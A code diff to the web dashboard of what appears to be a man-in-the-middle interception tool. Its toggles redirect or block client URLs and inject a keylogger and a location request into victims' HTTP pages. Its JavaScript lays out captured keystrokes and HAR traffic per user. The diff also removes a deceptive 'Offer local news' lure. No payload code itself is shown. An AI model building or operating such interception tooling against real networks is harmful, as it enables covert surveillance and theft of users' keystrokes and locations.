@@ -70,18 +70,6 @@
         </li> -->
         <li class="list-group-item">
           <div class="onoffswitch">
-            <input type="checkbox" name="triggerRedirects" class="onoffswitch-checkbox" id="triggerRedirects">
-            <label class="onoffswitch-label" for="triggerRedirects">
-              <span class="onoffswitch-inner"></span>
-              <span class="onoffswitch-switch"></span>
-            </label>
-          </div>
-          <h4>Redirect URLs</h4>
-          <small>If url is in whitelist (currently hardcoded), the client will be redirected to local page of same name. This cant handle HTTPS/HSTS</small>
-        </li>
-
-        <li class="list-group-item">
-          <div class="onoffswitch">
             <input type="checkbox" name="triggerBlocks" class="onoffswitch-checkbox" id="triggerBlocks">
             <label class="onoffswitch-label" for="triggerBlocks">
               <span class="onoffswitch-inner"></span>
@@ -91,12 +79,34 @@
           <h4>Block URLs</h4>
           <small>If url is in whitelist (currently hardcoded), the client will be blocked. This cant handle HTTPS/HSTS</small>
         </li>
+        <li class="list-group-item">
+          <div class="onoffswitch">
+            <input type="checkbox" name="triggerRedirects" class="onoffswitch-checkbox" id="triggerRedirects">
+            <label class="onoffswitch-label" for="triggerRedirects">
+              <span class="onoffswitch-inner"></span>
+              <span class="onoffswitch-switch"></span>
+            </label>
+          </div>
+          <h4>Redirect URLs</h4>
+          <small>If url is in whitelist (currently hardcoded), the client will be redirected to local page of same name. This cant handle HTTPS/HSTS</small>
+        </li>
         <li class="list-group-item list-group-item-toggle dropdown-toggle" aria-expanded="false">
           <a data-toggle="collapse" href="#collapseInject" aria-expanded="true" data-toggle="dropdown" aria-controls="collapseInject"><h4>Inject Hook in HTTP <span class="caret"></span></h4>
           <small>Array of scripts that can be injected into the clients page</small>
           </a>
           <ul class="list-group collapse" id="collapseInject">
 
+            <li class="list-group-item">
+              <div class="onoffswitch">
+                <input type="checkbox" name="getLocation" class="onoffswitch-checkbox" id="getLocation">
+                <label class="onoffswitch-label" for="getLocation">
+                  <span class="onoffswitch-inner"></span>
+                  <span class="onoffswitch-switch"></span>
+                </label>
+              </div>
+              <h4>Get User Location</h4>
+              <small>Request the users location from the browser</small>
+            </li>
             <li class="list-group-item" title="This will inject a keylogger into the page if it can (i.e HTTP).">
               <div class="onoffswitch">
                 <input type="checkbox" name="keylogger" class="onoffswitch-checkbox" id="keylogger">
@@ -121,17 +131,7 @@
               <small>Attempt to take a photo with the web cam on the clients computer</small>
             </li> -->
 
-            <li class="list-group-item">
-              <div class="onoffswitch">
-                <input type="checkbox" name="getLocation" class="onoffswitch-checkbox" id="getLocation">
-                <label class="onoffswitch-label" for="getLocation">
-                  <span class="onoffswitch-inner"></span>
-                  <span class="onoffswitch-switch"></span>
-                </label>
-              </div>
-              <h4>Offer local news</h4>
-              <small>If the user is on a news site, offer local news if they share their location</small>
-            </li>
+
 <!-- 
             <li class="list-group-item">
               <div class="onoffswitch">
@@ -350,7 +350,7 @@ var opts = {
     $(".attackType").html("Injected - Get Har Files")
     $.each(data, function(i, j) {
       var descr = j.split("_", -1)
-      var listItem = $('<li><a href="#" id="'+j+'">'+descr[1]+' : ' + descr[2]+'</a></li>').click(function() {
+      var listItem = $('<li><a href="#" id="'+j+'">'+descr[2]+' : ' + descr[3]+'</a></li>').click(function() {
         $.getJSON( "/GetHar/?harname="+j, function( data ) {
           var obj = JSON.parse(data)
             initHarView();
@@ -390,7 +390,7 @@ function captureKeyLogs() {
     /*  * read in the json and create the object
        * the format is:
             {
-          "ip": {
+          "userId": {
               "website": {
                   "adomObject": [
                       { "text":"text", "Timestamp": "timestamp"}
@@ -404,31 +404,31 @@ function captureKeyLogs() {
         }
     */
     $.each(data, function(k, item) { //for each item in the data from the json
-      var ip = item.IP; //store all the data objects
+      var userId = item.UserId; //store all the data objects
       var website = item.Page;
       var domObject = item.DomObject;
       var content = item.Content;
       var timestamp = item.Timestamp;
-      if (theMap[ip] == null) { //check if the map[ip] entry exists
-          theMap[ip] = {}
+      if (theMap[userId] == null) { //check if the map[userId] entry exists
+          theMap[userId] = {}
       }
-      if (theMap[ip][website] == null) { //check whether the map[ip][whebsite] entry exists
-          theMap[ip][website] = {}
+      if (theMap[userId][website] == null) { //check whether the map[userId][whebsite] entry exists
+          theMap[userId][website] = {}
       }
-      if (theMap[ip][website][domObject] == null) { //check whether the dom object for the website exists
-        theMap[ip][website][domObject] = []
+      if (theMap[userId][website][domObject] == null) { //check whether the dom object for the website exists
+        theMap[userId][website][domObject] = []
       }
       var finalObject = {}
       finalObject["content"] = content //create an object of content against timestamp
       finalObject["timestamp"] = timestamp 
-      theMap[ip][website][domObject].push(finalObject) //push the object into the map
+      theMap[userId][website][domObject].push(finalObject) //push the object into the map
     })
     //once the map is created, create the dom objects to store it
     $.each(theMap, function(k, v) {
-      var user = document.createElement("div"); //a user object for each user (ip address)
-      user.setAttribute("id", k.replace(/\./g, "_")); //set the id to the ip address
+      var user = document.createElement("div"); //a user object for each user (userId)
+      user.setAttribute("id", k.replace(/\./g, "_")); //set the id to the userId 
       user.setAttribute("class", "user")
-      $(user).append("user: " + k) //set the text to the user IP
+      $(user).append("user: " + k) //set the text to the userId
 
       //for each website that the user visited
       $.each(v, function(i,website) {
@@ -509,8 +509,9 @@ $(document).ready(function() {
     $('#connectionButton').html(this.innerHTML + " <span class=\"caret\"></span>");
   });
   checkProxyState();
-  arpScan()
-  initHarView();
+  arpScan();
+
+ initHarView();
 
 })
 
